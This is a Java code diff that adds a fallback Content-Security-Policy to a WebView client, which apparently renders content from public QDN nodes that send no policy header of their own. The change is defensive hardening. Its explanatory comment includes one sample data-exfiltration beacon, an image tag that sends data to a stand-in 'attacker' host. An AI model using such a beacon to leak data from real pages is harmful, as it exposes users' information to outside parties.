@@ -31,6 +31,33 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
     static final long RESOURCE_STREAM_RESPONSE_MAX_BYTES = 512L * 1024L * 1024L;
     static final long RESOURCE_STREAM_TOTAL_MAX_BYTES = 4L * 1024L * 1024L * 1024L;
     static final String HOME_QDN_CONNECTION_POLICY = "connect-src 'self' blob:;";
+
+    /**
+     * The policy Home applies when the upstream response carries NO
+     * Content-Security-Policy of its own.
+     *
+     * <p>Adding only {@link #HOME_QDN_CONNECTION_POLICY} is enough when the
+     * node supplied a policy, because policies INTERSECT — Core's already
+     * bounds images, scripts and media. With no upstream policy there is
+     * nothing to intersect with, and a connection-only policy leaves the other
+     * outbound channels wide open: {@code <img src="https://attacker/?d=…">}
+     * is a data-exfiltration beacon that needs no WebSocket and no fetch.
+     *
+     * <p>That is not a hypothetical for Home, which connects to PUBLIC nodes it
+     * does not control. A node that simply omits the header — through age,
+     * misconfiguration, or intent — would otherwise get a weaker sandbox than
+     * one that sets a policy, which is exactly backwards.
+     *
+     * <p>Mirrors Core's own rendered-document policy, minus any external
+     * origin: same-origin, data: and blob: only.
+     */
+    static final String HOME_QDN_MINIMUM_POLICY =
+        "default-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
+        "font-src 'self' data:; " +
+        "media-src 'self' data: blob:; " +
+        "img-src 'self' data: blob:; " +
+        "worker-src 'self' blob:; " +
+        "connect-src 'self' blob:;";
     // Round 6: moved to QdnRenderProxy so its exact-URL document-identity
     // normalization (which must ignore this exact param) and this class's own
     // use of it as the actual carried credential can never drift apart — see
@@ -1015,7 +1042,12 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
             }
         }
 
-        upstreamPolicies.add(HOME_QDN_CONNECTION_POLICY);
+        // With an upstream policy present, Home's connection policy intersects
+        // with it and the rest of the sandbox is Core's. With none, Home must
+        // supply the whole sandbox itself.
+        upstreamPolicies.add(upstreamPolicies.isEmpty()
+            ? HOME_QDN_MINIMUM_POLICY
+            : HOME_QDN_CONNECTION_POLICY);
         headers.put("Content-Security-Policy", String.join(", ", upstreamPolicies));
         return headers;
     }
